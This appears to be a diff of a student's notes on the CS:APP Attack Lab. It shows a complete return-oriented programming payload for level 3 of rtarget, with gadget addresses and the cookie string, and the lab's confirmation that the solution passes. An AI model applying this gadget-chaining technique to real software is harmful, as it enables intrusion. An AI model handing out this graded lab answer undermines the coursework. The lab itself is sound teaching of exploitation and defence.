@@ -90,3 +90,33 @@ czy-307-thinkcentre-m720q-n000 :: CSAPP_Lab/Attack/target1 » bat exploit.txt
 czy-307-thinkcentre-m720q-n000 :: CSAPP_Lab/Attack/target1 » 
 
 # 5
+<<< czy@czy-ThinkCentre~/new_space/CSAPP_Lab/Attack/target1
+>>> bat exploit.txt                                                                       ‹git:master ✘› 00:18.04 Sun Dec 24 2023 >>> 
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: exploit.txt
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1 + │ 00 00 00 00 00 00 00 00 
+   2   │ 00 00 00 00 00 00 00 00
+   3 + │ 00 00 00 00 00 00 00 00 
+   4   │ 00 00 00 00 00 00 00 00
+   5 ~ │ 00 00 00 00 00 00 00 00 
+   6 ~ │ ad 1a 40 00 00 00 00 00     /* movq %rsp, %rax */
+   7 ~ │ a2 19 40 00 00 00 00 00     /* movq %rax, %rdi */
+   8 ~ │ cc 19 40 00 00 00 00 00     /* popq %rax */
+   9 ~ │ 48 00 00 00 00 00 00 00     
+  10 ~ │ dd 19 40 00 00 00 00 00     /* movl %eax, %edx */
+  11 ~ │ 70 1a 40 00 00 00 00 00     /* movl %edx, %ecx */
+  12 ~ │ 13 1a 40 00 00 00 00 00     /* movl %ecx, %esi */
+  13 ~ │ d6 19 40 00 00 00 00 00     /* lea  (%rdi,%rsi,1),%rax */
+  14 ~ │ a2 19 40 00 00 00 00 00     /* movq %rax, %rdi */
+  15 ~ │ fa 18 40 00 00 00 00 00     /* touch3 address */
+  16 ~ │ 35 39 62 39 39 37 66 61     /* cookie string*/
+Continuing.
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
+[Inferior 1 (process 33294) exited normally]
